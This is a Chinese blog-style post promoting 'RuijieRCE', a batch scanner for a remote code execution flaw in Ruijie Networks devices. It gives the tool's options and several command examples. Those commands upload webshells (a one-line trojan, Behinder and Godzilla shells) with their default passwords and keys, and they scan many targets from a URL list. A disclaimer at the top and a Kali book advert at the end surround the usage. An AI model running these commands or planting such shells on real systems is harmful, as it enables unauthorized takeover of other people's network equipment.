#  锐捷RCE漏洞检测工具 -- RuijieRCE(2月26日更新)   
inbornavenue  Web安全工具库   2025-02-26 16:03  
  
===================================  
免责声明请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。个人微信：ivu123ivu  
0x01 工具介绍  
Ruijie Networks RCE漏洞检测工具，为方便渗透测试使用，可以批量检测，也会生成历史记录。同时也为防止他人恶意使用，可自定义GET参数密码，该密码由sha256加密，难以破解。同时也可以上传冰蝎马或者哥斯拉马。批量检测支持并发。  
```
Usage of ./RuijieRCE:
  -f string
    	导入.txt文件批量扫描
  -k string
    	写入shell密钥，一句话马默认为cmd，哥斯拉马默认为key，冰蝎马没有密钥
  -n string
    	写入shell默认一句话马🐎，B冰蝎马，G哥斯拉马
  -p string
    	写入shell密码，一句话马默认为cmd，哥斯拉马默认为pass，冰蝎马默认为rebeyond
  -u string
    	目标URL
```  
  
0x02 安装与使用  
检测到漏洞后生成随机数.php文件执行命令，也可以上菜刀。   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8H1dCzib3Uibt3nicAjg5lyTLHdXCDyriaUDuUyRhnzZEjHGQ88gUaM58xoYttDvGDiaW6wicPG1DSFgl5b0vJAJWs3w/640?wx_fmt=png&from=appmsg "")  
  
上传一句话木马  
  
GET密码：cmd POST密码：cmd  
```
./RuijieRCE -u http://127.0.0.1:4430
```  
  
设置密码  
  
-n参数为POST密码，-p参数为GET密码 这两个参数缺省时均为cmd，可以只设置一个或者同时都设置  
```
./RuijieRCE -u http://127.0.0.1:4430 -n asd -p zxc
```  
  
上传冰蝎马  
  
默认密钥为rebeyond，也可以使用-p参数修改  
```
./RuijieRCE -u http://127.0.0.1:4430 -n B -p rebeyond
```  
  
上传哥斯拉马  
  
哥斯拉加密器使用BASE64，默认密码为pass，密钥为key  
```
./RuijieRCE -u http://127.0.0.1:4430 -n G -p pass -k key
```  
  
批量测试  
  
批量测试时也可以设置上传冰蝎马、哥斯拉马以及自定义密码  
```
./RuijieRCE -f url.txt
```  
  
  
  
**·****今 日 推 荐**  
**·**  
  
> 《Kali渗透测试技术标准教程（实战微课版）》共8章，从Kali的起源讲起，介绍Kali的相关知识、渗透测试的相关内容、测试标准、实验环境、Kali的下载与安装、Kali的基本操作、终端窗口的操作、软件的安装、Kali系统的各种基础操作、信息收集的内容、信息收集工具的使用、信息枚举工具的使用、嗅探与欺骗的作用、抓包工具的使用、截包与改包工具的使用、欺骗工具的使用、漏洞的产生与危害、漏洞扫描工具的使用、漏洞的利用、假冒令牌的使用、社会工程学工具包的使用、网络服务密码攻击、常见密码的破解、密码字典的生成、无线网络与无线安全技术、无线密码的破解、无线网络钓鱼攻击等内容。  
  
  
  
  
